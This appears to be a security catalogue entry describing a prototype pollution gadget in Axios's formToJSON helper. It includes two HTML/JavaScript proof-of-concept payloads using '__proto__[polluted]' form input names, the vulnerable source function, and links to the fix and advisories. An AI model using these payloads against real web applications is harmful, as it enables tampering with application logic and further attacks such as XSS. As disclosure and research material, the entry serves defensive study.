---
description: Promise based HTTP client for the browser and node.js.
github: axios/axios
gadgets:
  v0.28.0 - v1.6.3:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - form-tag
      - name-attr
      - value-attr
      - before-func-call
    pocs:
      - description: The `formToJSON` method from [Axios](https://github.com/axios/axios) was vulnerable to prototype pollution. In the initial example, the form selector is hijacked via the id attribute.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.3/axios.js"></script>

          <!-- user input -->
          <form id="f">
            <input name="__proto__[polluted]" value="1">
          </form>

          <script>
            axios.post("/", document.getElementById("f"), {
              "headers": { "Content-Type": "application/json" }
            });
            // axios.formToJSON(document.getElementById("f"));
            alert(({}).polluted); // 1
          </script>
      - description: Another way to hijack the form is through the `form` attribute.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.3/axios.js"></script>
          <form id="f">
            <!-- [...] -->
          </form>

          <!-- user input -->
          <input form="f" name="__proto__[polluted]" value="1">

          <script>
            axios.post("/", document.getElementById("f"), {
              "headers": { "Content-Type": "application/json" }
            });
            // axios.formToJSON(document.getElementById("f"));
            alert(({}).polluted); // 1
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/axios/axios/blob/b15b918d179900e7d47a08f4e96efc89e16d8a7b/lib/helpers/formDataToJSON.js#L49">https://github.com/axios/axios/blob/b15b918d179900e7d47a08f4e96efc89e16d8a7b/lib/helpers/formDataToJSON.js#L49</a>

      ```javascript
      function formDataToJSON(formData) {
        function buildPath(path, value, target, index) {
          let name = path[index++];
          const isNumericKey = Number.isFinite(+name);
          const isLast = index >= path.length;
          name = !name && utils.isArray(target) ? target.length : name;

          if (isLast) {
            if (utils.hasOwnProp(target, name)) {
              target[name] = [target[name], value];
            } else {
              target[name] = value;
            }

            return !isNumericKey;
          }

          if (!target[name] || !utils.isObject(target[name])) {
            target[name] = [];
          }

          const result = buildPath(path, value, target[name], index);

          if (result && utils.isArray(target[name])) {
            target[name] = arrayToObject(target[name]);
          }

          return !isNumericKey;
        }

        if (utils.isFormData(formData) && utils.isFunction(formData.entries)) {
          const obj = {};

          utils.forEachEntry(formData, (name, value) => {
            buildPath(parsePropPath(name), value, obj, 0);
          });

          return obj;
        }

        return null;
      }
      ```
    links:
      - https://github.com/axios/axios/pull/4735
      - https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e
      - https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788
      - https://mizu.re/post/intigriti-january-2024-xss-challenge
---
